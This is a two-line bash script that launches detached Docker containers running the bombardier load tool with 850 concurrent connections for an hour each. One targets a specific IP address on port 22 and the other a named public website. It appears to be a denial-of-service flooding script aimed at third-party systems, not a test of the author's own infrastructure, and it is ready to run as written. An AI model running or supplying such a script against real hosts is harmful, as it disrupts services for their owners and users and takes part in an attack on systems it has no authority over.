#!/usr/bin/env bash

docker run -d --rm alpine/bombardier -c 850 -d 3600s -l 88.212.236.84:22
docker run -d --rm alpine/bombardier -c 850 -d 3600s -l http://fishki.net/

